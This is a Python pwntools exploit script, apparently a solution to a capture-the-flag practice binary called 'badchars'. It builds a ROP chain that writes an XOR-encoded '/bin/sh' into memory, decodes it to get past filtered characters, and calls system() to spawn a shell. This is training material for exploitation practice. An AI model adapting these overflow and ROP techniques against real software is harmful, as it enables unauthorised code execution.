#!/usr/bin/env python
"""
rsp found at offset: 40
rbp found at offset: 32

Writable sections (readelf --sections badchars --wide):
      [Nr] Name              Type            Address          Off    Size   ES Flg Lk Inf Al
        ...
      [19] .init_array       INIT_ARRAY      0000000000600e10 000e10 000008 00  WA  0   0  8
      [20] .fini_array       FINI_ARRAY      0000000000600e18 000e18 000008 00  WA  0   0  8
      [21] .jcr              PROGBITS        0000000000600e20 000e20 000008 00  WA  0   0  8
      [22] .dynamic          DYNAMIC         0000000000600e28 000e28 0001d0 10  WA  6   0  8
      [23] .got              PROGBITS        0000000000600ff8 000ff8 000008 08  WA  0   0  8
      [24] .got.plt          PROGBITS        0000000000601000 001000 000070 08  WA  0   0  8
      [25] .data             PROGBITS        0000000000601070 001070 000010 00  WA  0   0  8
      [26] .bss              NOBITS          0000000000601080 001080 000030 00  WA  0   0 32

Gadgets being used are:
    
    Found with objdump 
        4009e8:   e8 03 fd ff ff          call   4006f0 <system@plt>
        400b30:   45 30 37                xor    BYTE PTR [r15],r14b
        400b34:   4d 89 65 00             mov    QWORD PTR [r13+0x0],r12
    Found with ropper (ropper -f badchars -a x86_64)
        0x0000000000400b39: pop rdi; ret; 
        0x0000000000400b3b: pop r12; pop r13; ret; 
        0x0000000000400b3d: pop r13; ret; 
        0x0000000000400b42: pop r15; ret; 

badchars are: b i c / <space> f n s

62 69 63 2f 20 66 6e 73

"""

from pwn import *


def xor(s1, key):
    return ''.join([chr(ord(s1[i])^ord(key)) for i in range(len(s1))])
        
# print(xor("/bin/sh", 'D'))  # k&-*k7,

writable_addr = p64(0x0000601080) # Tried 0x0000601070 first but that meant having a 73 in the payload, so moved to 0x0000601080
popr14_pop15 = p64(0x0400b40)
popr12_popr13 = p64(0x0000000000400b3b)
popr15 = p64(0x0000000000400b42)
poprdi = p64(0x0000000000400b39)
movr13_r12 = p64(0x400b34)
xorr15_r14b = p64(0x400b30)
sys = p64(0x4009e8)

s = "k&-*k7,\x00"
key = p64(0x44)

payload = "M"*40
payload += popr12_popr13 + s + writable_addr
payload += movr13_r12
payload += popr14_pop15 + key + writable_addr
payload += xorr15_r14b
payload += popr15 + p64(0x0000601080+1) + xorr15_r14b
payload += popr15 + p64(0x0000601080+2) + xorr15_r14b
payload += popr15 + p64(0x0000601080+3) + xorr15_r14b
payload += popr15 + p64(0x0000601080+4) + xorr15_r14b
payload += popr15 + p64(0x0000601080+5) + xorr15_r14b
payload += popr15 + p64(0x0000601080+6) + xorr15_r14b
payload += poprdi + writable_addr + sys


p = process('./badchars')
p.recvuntil(">")
p.sendline(payload)
p.interactive()